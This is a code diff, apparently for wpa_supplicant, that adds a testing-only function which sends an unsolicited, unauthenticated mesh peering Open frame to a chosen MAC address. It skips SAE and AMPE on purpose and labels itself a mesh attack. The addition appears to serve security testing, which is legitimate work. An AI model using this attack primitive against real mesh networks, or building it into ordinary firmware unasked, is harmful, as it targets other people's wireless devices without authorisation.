+#ifdef CONFIG_TESTING_OPTIONS
+int mesh_attack_send_open(struct wpa_supplicant *wpa_s, const u8 *addr)
+{
+	struct hostapd_data *data = wpa_s->ifmsh ? wpa_s->ifmsh->bss[0] : NULL;
+	struct sta_info *sta;
+
+	if (!data)
+		return -1;
+	sta = ap_get_sta(data, addr);
+	if (!sta) {
+		/* Fresh peer we have NOT run SAE with: no PMKSA exists. */
+		sta = ap_sta_add(data, addr);
+		if (!sta)
+			return -1;
+		sta->flags |= WLAN_STA_WMM;
+	}
+	if (!sta->my_lid)
+		mesh_mpm_init_link(wpa_s, sta);
+
+	/* Force ampe=0 so the Open carries no AMPE IE / no PMKID and needs no
+	 * prior SAE/PMKSA with the target -- an unsolicited Open. */
+	mesh_attack_force_no_ampe = 1;
+	wpa_printf(MSG_INFO,
+		   "MESH-ATTACK: sending unsolicited Open (ampe=0, no PMKSA) to "
+		   MACSTR, MAC2STR(addr));
+	mesh_mpm_send_plink_action(wpa_s, sta, PLINK_OPEN, 0);
+	mesh_attack_force_no_ampe = 0;
+	return 0;
+}
+#endif /* CONFIG_TESTING_OPTIONS */
